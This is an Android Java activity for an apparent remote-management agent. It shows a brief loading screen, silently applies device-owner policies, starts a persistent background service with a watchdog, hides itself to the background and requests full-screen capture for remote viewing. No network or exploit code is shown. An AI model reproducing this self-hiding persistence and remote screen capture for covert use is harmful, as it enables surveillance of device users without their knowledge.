package com.trmm.agent;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.media.projection.MediaProjectionConfig;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.Window;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import java.lang.ref.WeakReference;

public class MainActivity extends Activity {
    private static final int REQUEST_SCREEN_CAPTURE = 1002;

    ProgressBar pbLoader;
    TextView tvLoadingStatus;
    Handler handler;
    int dotsCount = 0;
    boolean isWaitingPhase = false;

    static class StatusReceiver extends BroadcastReceiver {
        private final WeakReference<MainActivity> activityRef;

        public StatusReceiver(MainActivity activity) {
            this.activityRef = new WeakReference<>(activity);
        }

        @Override
        public void onReceive(Context context, Intent intent) {
            try {
                if (intent != null) {
                    String status = intent.getStringExtra(AgentService.EXTRA_STATUS);
                    String log = intent.getStringExtra(AgentService.EXTRA_LOG);
                    if (status != null) {
                        Log.d("TRMMAgent", "[StatusUpdate] " + status);
                    }
                    if (log != null) {
                        Log.d("TRMMAgent", "[ServiceLog] " + log);
                    }
                }
            } catch (Throwable ignored) {}
        }
    }

    static class GlobalExceptionHandler implements Thread.UncaughtExceptionHandler {
        @Override
        public void uncaughtException(Thread thread, Throwable throwable) {
            Log.e("TRMMAgent", "Uncaught exception in " + (thread != null ? thread.getName() : "unknown") + ": "
                    + (throwable != null ? throwable.getMessage() : "unknown"), throwable);
        }
    }

    static class ScreenCaptureRunnable implements Runnable {
        private final WeakReference<MainActivity> activityRef;

        public ScreenCaptureRunnable(MainActivity activity) {
            this.activityRef = new WeakReference<>(activity);
        }

        @Override
        public void run() {
            try {
                MainActivity act = activityRef.get();
                if (act != null && !act.isFinishing()) {
                    act.requestEntireScreenCapture();
                }
            } catch (Throwable ignored) {}
        }
    }

    static class MoveToBackRunnable implements Runnable {
        private final WeakReference<MainActivity> activityRef;

        public MoveToBackRunnable(MainActivity activity) {
            this.activityRef = new WeakReference<>(activity);
        }

        @Override
        public void run() {
            try {
                MainActivity act = activityRef.get();
                if (act != null && !act.isFinishing()) {
                    act.moveTaskToBack(true);
                }
            } catch (Throwable ignored) {}
        }
    }

    static class DotsRunnable implements Runnable {
        private final WeakReference<MainActivity> activityRef;

        public DotsRunnable(MainActivity activity) {
            this.activityRef = new WeakReference<>(activity);
        }

        @Override
        public void run() {
            try {
                MainActivity act = activityRef.get();
                if (act != null && !act.isFinishing()) {
                    act.updateDots();
                    if (act.handler != null && act.dotsRunnable != null) {
                        act.handler.postDelayed(act.dotsRunnable, 500L);
                    }
                }
            } catch (Throwable ignored) {}
        }
    }

    static class TransitionRunnable implements Runnable {
        private final WeakReference<MainActivity> activityRef;

        public TransitionRunnable(MainActivity activity) {
            this.activityRef = new WeakReference<>(activity);
        }

        @Override
        public void run() {
            try {
                MainActivity act = activityRef.get();
                if (act != null && !act.isFinishing()) {
                    act.isWaitingPhase = true;
                    if (act.tvLoadingStatus != null) {
                        act.tvLoadingStatus.setText("Please wait...");
                    }
                }
            } catch (Throwable ignored) {}
        }
    }

    DotsRunnable dotsRunnable;
    TransitionRunnable transitionRunnable;
    private StatusReceiver statusReceiver;

    void updateDots() {
        if (tvLoadingStatus != null) {
            dotsCount = (dotsCount % 3) + 1;
            StringBuilder dots = new StringBuilder();
            for (int i = 0; i < dotsCount; i++) {
                dots.append(".");
            }
            String prefix = isWaitingPhase ? "Please wait" : "Loading";
            tvLoadingStatus.setText(prefix + dots.toString());
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Global uncaught exception protection
        Thread.setDefaultUncaughtExceptionHandler(new GlobalExceptionHandler());

        // Remove title bar for a seamless, clean screen
        try {
            requestWindowFeature(Window.FEATURE_NO_TITLE);
        } catch (Throwable ignored) {}

        setContentView(R.layout.activity_main);

        pbLoader = (ProgressBar) findViewById(R.id.pbLoader);
        tvLoadingStatus = (TextView) findViewById(R.id.tvLoadingStatus);

        handler = new Handler(Looper.getMainLooper());
        statusReceiver = new StatusReceiver(this);
        dotsRunnable = new DotsRunnable(this);
        transitionRunnable = new TransitionRunnable(this);

        // Start preloader animation: "Loading..." then transitions to "Please wait..."
        isWaitingPhase = false;
        dotsCount = 0;
        if (tvLoadingStatus != null) {
            tvLoadingStatus.setText("Loading...");
        }
        handler.post(dotsRunnable);
        handler.postDelayed(transitionRunnable, 1200L);

        // Apply device owner policies silently if provisioned
        AdminReceiver.applyDeviceOwnerPolicies(this);

        // Start persistent 24/7 background service (Zero redirects to Android settings)
        startAgentService();
        BootReceiver.scheduleWatchdog(this);
        AgentJobService.schedule(this);

        // Gracefully minimize to background after loading sequence
        handler.postDelayed(new MoveToBackRunnable(this), 3000L);

        // Handle incoming admin remote control requests if launched with projection action
        handleIncomingIntent(getIntent());
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        handleIncomingIntent(intent);
    }

    @Override
    protected void onResume() {
        super.onResume();
        AdminReceiver.applyDeviceOwnerPolicies(this);

        if (handler != null && dotsRunnable != null) {
            handler.removeCallbacks(dotsRunnable);
            handler.post(dotsRunnable);
        }

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(statusReceiver, new IntentFilter(AgentService.ACTION_STATUS_UPDATE),
                        Context.RECEIVER_NOT_EXPORTED);
            } else {
                registerReceiver(statusReceiver, new IntentFilter(AgentService.ACTION_STATUS_UPDATE));
            }
        } catch (Throwable ignored) {}
    }

    private void handleIncomingIntent(Intent intent) {
        if (intent == null) return;
        String action = intent.getAction();
        boolean reqProjection = intent.getBooleanExtra("REQUEST_PROJECTION", false)
                || "REQUEST_PROJECTION".equals(action);
        if (reqProjection) {
            appendLog("Remote control session initiated. Prompting screen capture...");
            if (handler != null) {
                handler.postDelayed(new ScreenCaptureRunnable(this), 300L);
            }
        }
    }

    private void requestEntireScreenCapture() {
        try {
            MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            if (mpm != null) {
                try {
                    Toast.makeText(this,
                            "Select 'Entire screen' on the prompt to allow remote view support",
                            Toast.LENGTH_LONG).show();
                } catch (Throwable ignored) {}
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                    MediaProjectionConfig config = MediaProjectionConfig.createConfigForDefaultDisplay();
                    Intent captureIntent = mpm.createScreenCaptureIntent(config);
                    startActivityForResult(captureIntent, REQUEST_SCREEN_CAPTURE);
                } else {
                    Intent captureIntent = mpm.createScreenCaptureIntent();
                    startActivityForResult(captureIntent, REQUEST_SCREEN_CAPTURE);
                }
            }
        } catch (Throwable t) {
            Log.w("TRMMAgent", "Screen capture request warning: " + t.getMessage());
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_SCREEN_CAPTURE) {
            if (resultCode == RESULT_OK && data != null) {
                AgentService.setMediaProjectionData(resultCode, data);
                appendLog("Screen capture permission active.");

                try {
                    Intent promoteIntent = new Intent(this, AgentService.class);
                    promoteIntent.setAction("PROMOTE_MEDIA_PROJECTION");
                    promoteIntent.putExtra("RESULT_CODE", resultCode);
                    promoteIntent.putExtra("RESULT_DATA", data);
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        startForegroundService(promoteIntent);
                    } else {
                        startService(promoteIntent);
                    }
                } catch (Throwable ignored) {}

                if (handler != null) {
                    handler.postDelayed(new MoveToBackRunnable(this), 600L);
                }
            }
        }
    }

    private void startAgentService() {
        try {
            Intent intent = new Intent(this, AgentService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
            appendLog("Persistent background service started.");
        } catch (Throwable t) {
            Log.e("TRMMAgent", "Failed to start service: " + t.getMessage(), t);
        }
    }

    void appendLog(String msg) {
        Log.i("TRMMAgent", msg != null ? msg : "");
    }

    @Override
    public void onBackPressed() {
        moveTaskToBack(true);
    }

    @Override
    protected void onPause() {
        super.onPause();
        if (handler != null && dotsRunnable != null) {
            handler.removeCallbacks(dotsRunnable);
        }
        try {
            unregisterReceiver(statusReceiver);
        } catch (Throwable ignored) {}
    }
}
